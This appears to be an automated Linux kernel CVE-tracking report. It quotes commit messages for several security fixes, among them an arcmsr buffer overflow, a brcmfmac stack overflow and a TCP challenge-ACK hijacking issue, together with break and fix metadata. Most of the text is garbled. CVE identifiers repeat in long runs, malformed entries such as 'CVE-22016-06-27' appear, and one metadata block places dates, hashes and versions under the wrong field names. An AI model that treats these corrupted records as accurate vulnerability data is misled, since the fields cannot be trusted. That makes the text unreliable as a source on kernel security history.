 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Author: Eric Dumazet <edumazet@google.com>
Date:   Sun Jul 10 10:04:02 2016 +0200

    tcp: make challenge acks less predictable
    
    Yue Cao claims that current host rate limiting of challenge ACKS
    (RFC 5961) could leak enough information to allow a patient attacker
    to hijack TCP sessions. He will soon provide details in an academic
    paper.
    
    This patch increases the default limit from 100 to 1000, and adds
    some randomization so that the attacker can no longer hijack
    sessions without spending a considerable amount of probes.
    
    Based on initial analysis and patch from Linus.
    
    Note that we also have per socket rate limiting, so it is tempting
    to remove the host limit in the future.
    
    v2: randomize the count of challenge acks per second, not the period.
    
    Fixes: 282f23c6ee34 ("tcp: implement RFC 5961 3.2")
    Reported-by: Yue Cao <ycao009@ucr.edu>
